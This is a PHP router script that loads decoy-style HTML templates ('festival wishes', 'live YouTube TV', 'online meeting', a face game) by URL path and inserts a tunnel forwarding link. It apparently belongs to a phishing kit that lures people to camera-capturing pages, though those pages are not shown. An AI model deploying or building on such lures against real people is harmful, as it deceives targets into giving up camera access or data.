<?php
$configFile = '/data/config/session.env';
$config = [];
if (file_exists($configFile)) {
    foreach (file($configFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $line) {
        if (strpos($line, '=') !== false) {
            list($k, $v) = explode('=', $line, 2);
            $config[$k] = $v;
        }
    }
}

$defaultTemplate = $config['DEFAULT_TEMPLATE'] ?? '1';
$festivalName = $config['FESTIVAL_NAME'] ?? 'NewYear';
$youtubeId = $config['YOUTUBE_VIDEO_ID'] ?? 'dQw4w9WgXcQ';

$tunnelLink = getenv('TUNNEL_LINK') ?: 'forwarding_link';

$uri = $_SERVER['REQUEST_URI'] ?? '/';
$path = trim(parse_url($uri, PHP_URL_PATH), '/');

$template = $defaultTemplate;

$pathMap = [
    'g' => '4', 'game' => '4', 'face-runner' => '4', 'runner' => '4',
    'f' => '1', 'festival' => '1',
    'y' => '2', 'youtube' => '2', 'yt' => '2',
    'm' => '3', 'meeting' => '3',
];

if ($path !== '' && isset($pathMap[$path])) {
    $template = $pathMap[$path];
}

$templateFile = match ($template) {
    '2' => 'templates/LiveYTTV.html',
    '3' => 'templates/OnlineMeeting.html',
    '4' => 'templates/face-runner.html',
    default => 'templates/festivalwishes.html',
};

$html = file_get_contents($templateFile);
if ($html === false) {
    http_response_code(500);
    echo "Template not found";
    exit;
}

$html = str_replace('forwarding_link', $tunnelLink, $html);

if ($template === '1') {
    $html = str_replace('fes_name', $festivalName, $html);
} elseif ($template === '2') {
    $html = str_replace('live_yt_tv', $youtubeId, $html);
}

echo $html;
